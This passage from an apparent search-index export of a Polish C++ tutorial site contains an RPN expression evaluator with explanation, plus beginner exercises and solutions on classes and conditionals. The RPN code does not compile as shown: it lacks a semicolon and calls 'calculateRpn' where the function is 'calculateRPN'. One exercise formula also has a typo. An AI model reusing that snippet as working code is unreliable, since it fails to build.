0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/text/rpn/","title":"ONP","text":""},{"location":"programming/c%2B%2B/algorithms/text/rpn/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/text/rpn/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;stack&gt;\n\nusing namespace std;\n\ndouble compute(double a, double b, char op) {\n    switch(op) {\n        case '+':\n            return a + b;\n        case '-':\n            return a - b;\n        case '*':\n            return a * b;\n        case '/':\n            return a / b;\n    }\n}\n\ndouble calculateRPN(string rpn) {\n    stack&lt;double&gt; rpnStack;\n    double a, b, result;\n\n    for (int i = 0; i &lt; rpn.length(); i++) {\n        if (isdigit(rpn[i])) {\n            rpnStack.push(rpn[i] - '0');\n        } else {\n            b = rpnStack.top();\n            rpnStack.pop();\n\n            a = rpnStack.top();\n            rpnStack.pop();\n\n            result = compute(a, b, rpn[i])\n            rpnStack.push(result);\n        }\n    }\n\n    return rpnStack.top();\n}\n\nint main() {\n    string rpn = \"27+3/13-4*+2/\";\n\n    double result = calculateRpn(rpn);\n\n    cout &lt;&lt; result &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/text/rpn/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>calculateRPN</code> (linia 19) oblicza warto\u015b\u0107 wyra\u017cenia ONP podanego w formie ci\u0105gu znak\u00f3w. Zak\u0142adamy, \u017ce podane wyra\u017cenie jest poprawne, a ka\u017cdy znak reprezentuje jednocyfrow\u0105 liczb\u0119 lub operacj\u0119. </p> <p>Na pocz\u0105tku tworzymy stos do przechowywania wynik\u00f3w kolejnych oblicze\u0144 (linia 20), oraz pomocnicze zmienne do przechowywania bie\u017c\u0105cych warto\u015bci ze stosu oraz wyniku po\u015brednich operacji (linia 21). </p> <p>Nast\u0119pnie przechodzimy p\u0119tl\u0105 po ka\u017cdym znaku wyra\u017cenia ONP (linia 23). Je\u017celi przetwarzany aktualnie znak jest cyfr\u0105 (linia 24), to dodajemy jego liczbow\u0105 warto\u015b\u0107 na stos (linia 25). W przeciwnym przypadku (linia 26) mamy do czynienia z operatorem. Pobieramy wi\u0119c dwie ostatnie warto\u015bci ze stosu, zarazem je z niego usuwaj\u0105c (linie 27-31). Nast\u0119pnie korzystamy z pomocniczej funkcji <code>compute</code> by obliczy\u0107 wynik operacji (linia 33), kt\u00f3ry nast\u0119pnie wrzucamy na stos (linia 34).</p> <p>Po przetworzeniu wszystkich znak\u00f3w z wyra\u017cenia ONP na stosie powinna zosta\u0107 dok\u0142adnie jedna warto\u015b\u0107, kt\u00f3r\u0105 zwracamy jako wynik funkcji (linia 38).</p>"},{"location":"programming/c%2B%2B/exercises/","title":"\u0106wiczenia","text":"<p>Przed przyst\u0105pieniem do rozwi\u0105zywania zada\u0144 zapoznaj si\u0119 z poni\u017cszym opisem.</p> <p>Zadbaj o czytelno\u015b\u0107 swoich rozwi\u0105za\u0144, zar\u00f3wno od strony kodu jak i wypisywanych komunikat\u00f3w. Je\u017celi jest podana specyfikacja, to mo\u017cesz za\u0142o\u017cy\u0107, \u017ce dane b\u0119d\u0105 zgodne ze specyfikacj\u0105. Dane wej\u015bciowe nale\u017cy wczytywa\u0107 ze standardowego wej\u015bcia. Mo\u017cna za\u0142o\u017cy\u0107, \u017ce wszystkie liczby ca\u0142kowite b\u0119d\u0105 mie\u015bci\u0142y si\u0119 w typie integer (chyba, \u017ce napisano inaczej).</p> <p>Po\u015bwi\u0119\u0107 czas na rozwi\u0105zanie ka\u017cdego zadania. Zastan\u00f3w si\u0119 nad r\u00f3\u017cnymi sposobami podej\u015bcia i rozwi\u0105zania problemu.</p> <p>Zadania podzielone s\u0105 ze wzgl\u0119du na tematy. Tematy u\u0142o\u017cone s\u0105 w sugerowanej kolejno\u015bci poznawania zagadnie\u0144. Ka\u017cdy temat zawiera od kilku do kilkunastu zada\u0144. Po rozwini\u0119ciu tematu pojawi\u0105 si\u0119 przyk\u0142adowe rozwi\u0105zania poszczeg\u00f3lnych zada\u0144, ka\u017cde na osobnej stronie. Pami\u0119taj, \u017ce ka\u017cde zadanie mo\u017cna rozwi\u0105za\u0107 na kilka sposob\u00f3w. </p> <p>Danger</p> <p>Zajrzyj do przyk\u0142adowego rozwi\u0105zania dopiero, jak samodzielnie wykonasz zadanie.</p>"},{"location":"programming/c%2B%2B/exercises/oop/","title":"Programowanie obiektowe","text":""},{"location":"programming/c%2B%2B/exercises/oop/#zadanie-1","title":"Zadanie 1","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Do reprezentacji u\u0142amk\u00f3w i wykonywania na nich operacji wykorzystaj w\u0142asn\u0105 implementacj\u0119 klasy.</p>"},{"location":"programming/c%2B%2B/exercises/oop/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/oop/#dane","title":"Dane","text":"<ul> <li>\\(l1, m1\\) - licznik i mianownik pierwszego u\u0142amka, liczby ca\u0142kowite</li> <li>\\(op\\) - znak operacji: \\(+\\), \\(-\\), \\(*\\) lub \\(/\\)</li> <li>\\(l2, m2\\) - licznik i mianownik drugiego u\u0142amka, liczby ca\u0142kowite</li> </ul>"},{"location":"programming/c%2B%2B/exercises/oop/#wynik","title":"Wynik","text":"<ul> <li>Wynik dzia\u0142ania operacji \\(\\frac{l1}{m2}\\ op\\ \\frac{l2}{m2}\\) przedstawiony w formie u\u0142amka zwyczajnego (maksymalnie skr\u00f3conego), wypisany w formacie <code>licznik / mianownik</code>, np. <code>3 / 4</code></li> </ul>"},{"location":"programming/c%2B%2B/exercises/oop/#przykad-1","title":"Przyk\u0142ad 1","text":""},{"location":"programming/c%2B%2B/exercises/oop/#dane_1","title":"Dane","text":"<pre><code>l1 := 5\nm1 := 8\nop := '+'\nl2 := 5\nm2 := 8\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/oop/#wynik_1","title":"Wynik","text":"<pre><code>5 / 4\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/oop/#przykad-2","title":"Przyk\u0142ad 2","text":""},{"location":"programming/c%2B%2B/exercises/oop/#dane_2","title":"Dane","text":"<pre><code>l1 := -1\nm1 := 2\nop := '*'\nl2 := 2\nm2 := 4\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/oop/#wynik_2","title":"Wynik","text":"<pre><code>-1 / 4\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/oop/#zadanie-2","title":"Zadanie 2","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Do reprezentacji liczb i wykonywania na nich operacji wykorzystaj w\u0142asn\u0105 implementacj\u0119 klasy. Mo\u017cesz za\u0142o\u017cy\u0107, \u017ce warto\u015bci wszystkich liczb w systemie dziesi\u0119tnym zmieszcz\u0105 si\u0119 w typie <code>int</code>. Wszystkie litery powinny by\u0107 drukowane.</p>"},{"location":"programming/c%2B%2B/exercises/oop/#specyfikacja_1","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/oop/#dane_3","title":"Dane","text":"<ul> <li>\\(l1, p1\\) - liczba \\(l1\\) reprezentowana w podstawie \\(p1\\), \\(2 \\leq p1 \\leq 16\\)</li> <li>\\(l2, p2\\) - liczba \\(l2\\) reprezentowana w podstawie \\(p2\\), \\(2 \\leq p2 \\leq 16\\)</li> <li>\\(p3\\) - docelowa podstawa, \\(2 \\leq p3 \\leq 16\\)</li> </ul>"},{"location":"programming/c%2B%2B/exercises/oop/#wynik_3","title":"Wynik","text":"<ul> <li>Suma podanych warto\u015bci przedstawiona w podstawie \\(p3\\)</li> </ul>"},{"location":"programming/c%2B%2B/exercises/oop/#przykad-1_1","title":"Przyk\u0142ad 1","text":""},{"location":"programming/c%2B%2B/exercises/oop/#dane_4","title":"Dane","text":"<pre><code>l1 := 1010\np1 := 2\nl2 := 5\np2 := 10\np3 := 8\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/oop/#wynik_4","title":"Wynik","text":"<pre><code>17\n</code></pre> <p>Info</p> <p>Wyja\u015bnienie</p> <p>\\(1010_2+5_{10}=17_8\\)</p>"},{"location":"programming/c%2B%2B/exercises/oop/#przykad-2_1","title":"Przyk\u0142ad 2","text":""},{"location":"programming/c%2B%2B/exercises/oop/#dane_5","title":"Dane","text":"<pre><code>l1 := 1010\np1 := 2\nl2 := 5\np2 := 10\np3 := 16\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/oop/#wynik_5","title":"Wynik","text":"<pre><code>F\n</code></pre> <p>Info</p> <p>Wyja\u015bnienie</p> <p>\\(1010_2+5_{10}=F_16\\)</p>"},{"location":"programming/c%2B%2B/exercises/oop/#zadanie-3","title":"Zadanie 3","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Do reprezentacji liczb zespolonych i wykonywania na nich operacji wykorzystaj w\u0142asn\u0105 implementacj\u0119 klasy. Operacje arytmetyczne, a tak\u017ce wczytywanie i wypisywanie liczb na ekran zrealizuj za pomoc\u0105 przeci\u0105\u017conych operator\u00f3w. Informacje na temat liczb zespolonych mo\u017cna znale\u017a\u0107 na stronie Wikipedii: https://pl.wikipedia.org/wiki/Liczby_zespolone</p>"},{"location":"programming/c%2B%2B/exercises/oop/#specyfikacja_2","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/oop/#dane_6","title":"Dane","text":"<ul> <li>\\(re1, im1\\) - cz\u0119\u015b\u0107 rzeczywista i urojona pierwszej liczby, liczby ca\u0142kowite</li> <li>\\(op\\) - znak operacji: \\(+\\), \\(-\\), \\(*\\) lub \\(/\\)</li> <li>\\(re2, im2\\) - cz\u0119\u015b\u0107 rzeczywista i urojona drugiej liczby, liczby ca\u0142kowite</li> </ul>"},{"location":"programming/c%2B%2B/exercises/oop/#wynik_6","title":"Wynik","text":"<ul> <li>Wynik dzia\u0142ania operacji \\(\\Re{re1}+\\Im{im1} op\\ \\Re{re2}+\\Im{im2}\\) przedstawiony w formacie <code>re + imi</code>, np. <code>3 + 4i</code></li> </ul>"},{"location":"programming/c%2B%2B/exercises/oop/#przykad","title":"Przyk\u0142ad","text":""},{"location":"programming/c%2B%2B/exercises/oop/#dane_7","title":"Dane","text":"<pre><code>3 5\n+\n7 11\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/oop/#wynik_7","title":"Wynik","text":"<pre><code>10 + 16i\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/oop/#zadanie-4","title":"Zadanie 4","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.  Dane przechowuj w tablicy dynamicznej, kt\u00f3r\u0105 samodzielnie zaimplementujesz za pomoc\u0105 klasy. Zaimplementuj dost\u0119p do danych za pomoc\u0105 przeci\u0105\u017cenia operatora []. Wszystkie arytmetyczne obliczenia zaimplementuj jako metody w klasie. Zadbaj o czyszczenie pami\u0119ci przy u\u017cyciu destruktora klasy.</p>"},{"location":"programming/c%2B%2B/exercises/oop/#specyfikacja_3","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/oop/#dane_8","title":"Dane","text":"<ul> <li>\\(a1, a2, a3...\\) - ci\u0105g liczb ca\u0142kowitych</li> </ul>"},{"location":"programming/c%2B%2B/exercises/oop/#wynik_8","title":"Wynik","text":"<ul> <li>\u015arednia, suma oraz mediana podanych liczb wypisane w odpowiednim komunikacie.</li> </ul>"},{"location":"programming/c%2B%2B/exercises/oop/#przykad_1","title":"Przyk\u0142ad","text":""},{"location":"programming/c%2B%2B/exercises/oop/#dane_9","title":"Dane","text":"<pre><code>1 2 3 4 5 6 7 8 9\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/oop/#wynik_9","title":"Wynik","text":"<pre><code>average = 5\nsum = 45\nmedian = 5\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/","title":"Instrukcja warunkowa","text":""},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#zadanie-1","title":"Zadanie 1","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Nie korzystaj z funkcji abs, fabs</p>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#dane","title":"Dane","text":"<ul> <li>\\(a\\) - liczba ca\u0142kowita</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#wynik","title":"Wynik","text":"<ul> <li>Warto\u015b\u0107 bezwzgl\u0119dna z \\(a\\)</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#przykad","title":"Przyk\u0142ad","text":""},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#dane_1","title":"Dane","text":"<pre><code>a := -2\n</code></pre> <p>Wynik: \\(2\\) </p>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#zadanie-2","title":"Zadanie 2","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#specyfikacja_1","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#dane_2","title":"Dane","text":"<ul> <li>\\(a\\) - liczba ca\u0142kowita</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#wynik_1","title":"Wynik","text":"<ul> <li>Znak liczby \\(a\\), tzn. \\(1\\) gdy \\(a\\) jest dodatnie, \\(-1\\) gdy \\(a\\) jest ujemne, \\(0\\) gdy \\(a\\) wynosi \\(0\\) </li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#przykad-1","title":"Przyk\u0142ad 1","text":""},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#dane_3","title":"Dane","text":"<pre><code>a := 5\n</code></pre> <p>Wynik: \\(1\\) </p>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#przykad-2","title":"Przyk\u0142ad 2","text":""},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#dane_4","title":"Dane","text":"<pre><code>a := -5\n</code></pre> <p>Wynik: \\(-1\\) </p>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#przykad-3","title":"Przyk\u0142ad 3","text":""},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#dane_5","title":"Dane","text":"<pre><code>a := 0\n</code></pre> <p>Wynik: \\(0\\) </p>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#zadanie-3","title":"Zadanie 3","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#specyfikacja_2","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#dane_6","title":"Dane","text":"<ul> <li>\\(a, b\\) - dwie liczby ca\u0142kowite</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#wynik_2","title":"Wynik","text":"<ul> <li>Wynik dzielenia liczb \\(a\\) i \\(b\\), lub komunikat, \u017ce nie mo\u017cna wykona\u0107 dzielenia.</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#przykad_1","title":"Przyk\u0142ad","text":""},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#dane_7","title":"Dane","text":"<pre><code>a := 1\nb := 2\n</code></pre> <p>Wynik: \\(0.5\\) </p>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#zadanie-4","title":"Zadanie 4","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Nie korzystaj z funkcji min, max.</p>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#specyfikacja_3","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#dane_8","title":"Dane","text":"<ul> <li>\\(a, b, c\\) - trzy liczby ca\u0142kowite</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#wynik_3","title":"Wynik","text":"<ul> <li>Najwi\u0119ksza z liczb \\(a\\), \\(b\\) i \\(c\\) , lub dowolna gdy s\u0105 sobie r\u00f3wne</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#przykad_2","title":"Przyk\u0142ad","text":""},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#dane_9","title":"Dane","text":"<pre><code>a := 4\nb := 1\nc := 3\n</code></pre> <p>Wynik: \\(4\\) </p>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#zadanie-5","title":"Zadanie 5","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Nie korzystaj z funkcji min, max.</p>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#specyfikacja_4","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#dane_10","title":"Dane","text":"<ul> <li>\\(a, b, c, d\\) - cztery liczby ca\u0142kowite</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#wynik_4","title":"Wynik","text":"<ul> <li>Najwi\u0119ksza z liczb \\(a, b, c\\) i \\(d\\), lub dowolna gdy s\u0105 sobie r\u00f3wne</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#przykad_3","title":"Przyk\u0142ad","text":""},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#dane_11","title":"Dane","text":"<pre><code>a := 3\nb := 1\nc := 3\nd := 5\n</code></pre> <p>Wynik: \\(5\\) </p>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#zadanie-6","title":"Zadanie 6","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Zadbaj o czytelno\u015b\u0107 programu.</p>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#specyfikacja_5","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#dane_12","title":"Dane","text":"<ul> <li>\\(a, b\\) - dwie liczby ca\u0142kowite</li> <li>\\(op\\) - znak jednej z dozwolonych operacji: \\(+,-,*,/\\) </li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#wynik_5","title":"Wynik","text":"<ul> <li>Wynik dzia\u0142ania\\(a\\ op\\ b\\) (np. \\(a+b\\)), lub komunikat, \u017ce nie mo\u017cna wykona\u0107 dzielenia.</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#przykad_4","title":"Przyk\u0142ad","text":""},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#dane_13","title":"Dane","text":"<pre><code>a := 3\nb := 1\nop := '+'\n</code></pre> <p>Wynik: \\(4\\) </p>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#zadanie-7","title":"Zadanie 7","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p> <p>Info</p> <p>Rok przest\u0119pny to taki, kt\u00f3ry:</p> <ul> <li>jest podzielny przez 4, ale nie jest podzielny przez 100, lub</li> <li>jest podzielny przez 400</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#specyfikacja_6","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#dane_14","title":"Dane","text":"<ul> <li>\\(rok\\) - liczba naturalna</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#wynik_6","title":"Wynik","text":"<ul> <li>Komunikat okre\u015blaj\u0105cy, czy podany rok jest przest\u0119pny czy te\u017c nie</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#przykad_5","title":"Przyk\u0142ad","text":""},{"location":"programming/c%2B%2B/exercises/conditional-instruction/#dane_15","title":"Dane","text":"<pre><code>rok := 2021\n</code></pre> <p>Wynik:  \"Rok 2021 nie jest przest\u0119pny\"</p>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-1/","title":"Rozwi\u0105zanie 1","text":""},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-1/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Nie korzystaj z funkcji abs, fabs</p>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-1/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-1/#dane","title":"Dane","text":"<ul> <li>\\(a\\) - liczba ca\u0142kowita</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-1/#wynik","title":"Wynik","text":"<ul> <li>Warto\u015b\u0107 bezwzgl\u0119dna z \\(a\\)</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-1/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    int a;\n\n    cout &lt;&lt; \"Podaj liczbe:\" &lt;&lt; endl;\n    cin &gt;&gt; a;\n\n    if(a &lt; 0) {\n        cout &lt;&lt; \"|\" &lt;&lt; a &lt;&lt; \"| = \" &lt;&lt; -a &lt;&lt; endl;\n    } else {\n        cout &lt;&lt; \"|\" &lt;&lt; a &lt;&lt; \"| = \" &lt;&lt; a &lt;&lt; endl;\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-2/","title":"Rozwi\u0105zanie 2","text":""},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-2/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-2/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-2/#dane","title":"Dane","text":"<ul> <li>\\(a\\) - liczba ca\u0142kowita</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-2/#wynik","title":"Wynik","text":"<ul> <li>Znak liczby \\(a\\), tzn. \\(1\\) gdy \\(a\\) jest dodatnie, \\(-1\\) gdy \\(a\\) jest ujemne, \\(0\\) gdy \\(a\\) wynosi \\(0\\) </li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-2/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    int a;\n\n    cout &lt;&lt; \"Podaj liczbe:\" &lt;&lt; endl;\n    cin &gt;&gt; a;\n\n    cout &lt;&lt; \"Znak podanej liczby: \";\n    if (a &lt; 0) {\n        cout &lt;&lt; -1 &lt;&lt; endl;\n    } else if (a &gt; 0) {\n        cout &lt;&lt; 1 &lt;&lt; endl;\n    } else {\n        cout &lt;&lt; 0 &lt;&lt; endl;\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-3/","title":"Rozwi\u0105zanie 3","text":""},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-3/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-3/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-3/#dane","title":"Dane","text":"<ul> <li>\\(a, b\\) - dwie liczby ca\u0142kowite</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-3/#wynik","title":"Wynik","text":"<ul> <li>Wynik dzielenia liczb \\(a\\) i \\(b\\), lub komunikat, \u017ce nie mo\u017cna wykona\u0107 dzielenia.</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-3/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    int a, b;\n    double wynik;\n\n    cout &lt;&lt; \"Podaj dwie liczby:\" &lt;&lt; endl;\n    cin &gt;&gt; a &gt;&gt; b;\n\n    if (b == 0) {\n        cout &lt;&lt; \"Nie mozna dzielic przez 0\" &lt;&lt; endl;\n    } else {\n        wynik = (double)a / (double)b;\n        cout &lt;&lt; a &lt;&lt; \" / \" &lt;&lt; b &lt;&lt; \" = \" &lt;&lt; wynik &lt;&lt; endl;\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-4/","title":"Rozwi\u0105zanie 4","text":""},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-4/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Nie korzystaj z funkcji min, max.</p>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-4/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-4/#dane","title":"Dane","text":"<ul> <li>\\(a, b, c\\) - trzy liczby ca\u0142kowite</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-4/#wynik","title":"Wynik","text":"<ul> <li>Najwi\u0119ksza z liczb \\(a\\), \\(b\\) i \\(c\\) , lub dowolna gdy s\u0105 sobie r\u00f3wne</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-4/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    int a, b, c, maks;\n\n    cout &lt;&lt; \"Podaj trzy liczby:\" &lt;&lt; endl;\n    cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;\n\n    if (a &gt;= b &amp;&amp; a &gt;= c) {\n        maks = a;\n    } else if (b &gt;= a &amp;&amp; b &gt;= c) {\n        maks = b;\n    } else {\n        maks = c;\n    }\n\n    cout &lt;&lt; \"Maksimum: \" &lt;&lt; maks &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-5/","title":"Rozwi\u0105zanie 5","text":""},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-5/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Nie korzystaj z funkcji min, max.</p>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-5/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-5/#dane","title":"Dane","text":"<ul> <li>\\(a, b, c, d\\) - cztery liczby ca\u0142kowite</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-5/#wynik","title":"Wynik","text":"<ul> <li>Najwi\u0119ksza z liczb \\(a, b, c\\) i \\(d\\), lub dowolna gdy s\u0105 sobie r\u00f3wne</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-5/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    int a, b, c, d, maks;\n\n    cout &lt;&lt; \"Podaj cztery liczby:\" &lt;&lt; endl;\n    cin &gt;&gt; a &gt;&gt; b &gt;&gt; c &gt;&gt; d;\n\n    if (a &gt;= b &amp;&amp; a &gt;= c &amp;&amp; a &gt;= d) {\n        maks = a;\n    } else if (b &gt;= a &amp;&amp; b &gt;= c &amp;&amp; b &gt;= d) {\n        maks = b;\n    } else if (c &gt;= a &amp;&amp; c &gt;= b &amp;&amp; c &gt;= d) {\n        maks = c;\n    } else {\n        maks = d;\n    }\n\n    cout &lt;&lt; \"Maksimum: \" &lt;&lt; maks &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-6/","title":"Rozwi\u0105zanie 6","text":""},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-6/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Zadbaj o czytelno\u015b\u0107 programu.</p>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-6/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-6/#dane","title":"Dane","text":"<ul> <li>\\(a, b\\) - dwie liczby ca\u0142kowite</li> <li>\\(op\\) - znak jednej z dozwolonych operacji: \\(+,-,*,/\\) </li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-6/#wynik","title":"Wynik","text":"<ul> <li>Wynik dzia\u0142ania\\(a\\ op\\ b\\) (np. \\(a+b\\)), lub komunikat, \u017ce nie mo\u017cna wykona\u0107 dzielenia.</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-6/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    int a, b;\n    char op;\n\n    cout &lt;&lt; \"Podaj dwie liczby:\" &lt;&lt; endl;\n    cin &gt;&gt; a &gt;&gt; b;\n\n    cout &lt;&lt; \"Podaj znak dzialania:\" &lt;&lt; endl;\n    cin &gt;&gt; op;\n\n    if (op == '+') {\n        cout &lt;&lt; a &lt;&lt; \" + \" &lt;&lt; b &lt;&lt; \" = \" &lt;&lt; a + b &lt;&lt; endl;\n    } else if (op == '-') {\n        cout &lt;&lt; a &lt;&lt; \" - \" &lt;&lt; b &lt;&lt; \" = \" &lt;&lt; a - b &lt;&lt; endl;\n    } else if (op == '*') {\n        cout &lt;&lt; a &lt;&lt; \" * \" &lt;&lt; b &lt;&lt; \" = \" &lt;&lt; a * b &lt;&lt; 